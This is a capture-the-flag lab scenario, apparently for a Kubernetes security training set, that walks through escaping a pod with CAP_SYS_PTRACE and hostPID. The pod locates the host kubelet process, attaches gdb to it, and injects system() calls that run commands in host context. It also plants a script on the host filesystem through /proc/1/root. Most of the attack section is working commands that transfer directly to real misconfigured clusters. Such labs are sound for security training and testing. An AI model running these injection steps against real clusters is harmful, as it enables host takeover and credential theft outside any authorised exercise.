# K8S-19: CAP_SYS_PTRACE Host Process Injection

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-19 |
| 名称 | CAP_SYS_PTRACE Host Process Injection |
| 技术/CVE | CAP_SYS_PTRACE abuse |
| 难度 | L3 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |

## 场景概述
- 技术：CAP_SYS_PTRACE abuse
- 难度：L3
- 交付方式：k8s
## 攻击路径与利用步骤

## Overview
| Property | Value |
|----------|-------|
| CVE/Technique | CAP_SYS_PTRACE + CAP_SYS_ADMIN abuse, hostPID: true |
| Difficulty | L3 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-19-ptrace |
| Flag Location | `/host-flag/flag.txt` on the KIND node (not mounted into the pod; reachable only via host process injection) |

## Attack Path Summary
1. Pod runs with `CAP_SYS_PTRACE` and `CAP_SYS_ADMIN` capabilities, `hostPID: true`
2. Ubuntu 22.04 image with `gdb` installed
3. Identify `kubelet` process PID on the host (visible via hostPID)
4. Attach `gdb` to the kubelet process
5. Use `gdb` to call `system()` inside the kubelet process, writing the flag to a readable file
6. Read the flag from the temporary file

## Prerequisites
- kubectl access to KIND cluster `cve-k8s-19-ptrace`
- Pod name: `ptrace-pod`
- Tools inside pod: `gdb` (pre-installed), `bash`, `ps`, `cat`

## Step-by-Step Exploitation

### Step 1: Initial Access
Exec into the pod with elevated capabilities:

```bash
kubectl exec -it ptrace-pod -- bash
```

Verify capabilities and hostPID access:

```bash
# Check that we can see host processes
ps aux | head -20
# Expected: shows ALL processes on the KIND node, not just container processes
# Key processes to identify: kubelet, containerd, kube-apiserver

# Verify capabilities
cat /proc/self/status | grep CapEff
# Expected: hex value (will include CAP_SYS_PTRACE and CAP_SYS_ADMIN bits)

# Decode capabilities
cat /proc/self/status | grep CapEff | awk '{print $2}' | while read cap; do
    capsh --decode=$cap
done
# Verify CAP_SYS_PTRACE and CAP_SYS_ADMIN are present
```

### Step 2: Find the Kubelet Process
```bash
# Find the kubelet PID
ps aux | grep kubelet | grep -v grep
# Expected:
# root      <PID>  ... /usr/bin/kubelet ...

# Note the PID (typically the first number in the output)
KUBELET_PID=$(ps aux | grep '[k]ubelet' | awk '{print $2}')
echo "Kubelet PID: $KUBELET_PID"
```

### Step 3: Verify gdb is Available
```bash
which gdb
# Expected: /usr/bin/gdb

# If gdb is not installed:
apt-get update && apt-get install -y gdb
```

### Step 4: Inject Command via gdb
Use `gdb` to attach to the kubelet process and call `system()`:

```bash
# Approach 1: Direct attach and call (may fail if no libc symbols)
gdb -p $KUBELET_PID \
    -batch \
    -ex "call (int)system(\"cat /host-flag/flag.txt > /tmp/flag_out.txt\")"

# Approach 2: Interactive gdb session (more reliable)
gdb -p $KUBELET_PID
```

Inside the interactive gdb session:

```
(gdb) call (int)system("cat /host-flag/flag.txt > /tmp/flag_out.txt")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1"

Program received signal SIGSTOP, Stopped (signal).
[Switching to Thread <PID>]
<... output ...>
$1 = 0

(gdb) quit
```

### Step 5: Read the Flag
```bash
# The injected system() call ran inside kubelet (host context), so the output
# file is on the host. Read it through the hostPID /proc view:
cat /proc/1/root/tmp/flag_out.txt
# Expected: flag{k8s-19-*}
```

### Step 6: Alternative -- Shell Reverse via system()
For a more interactive foothold on the host:

```bash
# Write the script to the HOST filesystem (kubelet will execute it from host /tmp)
echo '#!/bin/bash
cat /host-flag/flag.txt > /tmp/flag_out.txt' > /proc/1/root/tmp/escape.sh
chmod +x /proc/1/root/tmp/escape.sh

# Inject execution
gdb -p $KUBELET_PID -batch -ex "call (int)system(\"bash /tmp/escape.sh\")"
```

### Step 7: Capture Flag
- Flag format: `flag{k8s-19-*}`
- Flag location: `/host-flag/flag.txt` on the KIND node
- Read method: inject `system()` call via gdb into kubelet process to write flag to `/tmp/flag_out.txt`
- Expected output: `flag{k8s-19-default}` (or custom value from `CVE_FLAG`)

## Verification Commands
```bash
# Verify the scenario is deployed and running
kubectl get pod ptrace-pod
# Expected: NAME         READY   STATUS    RESTARTS   AGE
#           ptrace-pod   1/1     Running   0          ...

# Verify capabilities
kubectl exec ptrace-pod -- cat /proc/self/status | grep CapEff

# Verify hostPID access (should see kubelet and other host processes)
kubectl exec ptrace-pod -- ps aux | grep kubelet

# Verify gdb is available
kubectl exec ptrace-pod -- which gdb
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Linux processes, ptrace, and host PID namespaces |
| 侦察与前置条件 | CAP_SYS_PTRACE and host process visibility |
| 核心漏洞与利用 | Inject or inspect a host process with ptrace |
| 权限、横向或影响 | Host credential/process compromise |
| 验证 | Extract the flag from the targeted host process/filesystem |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
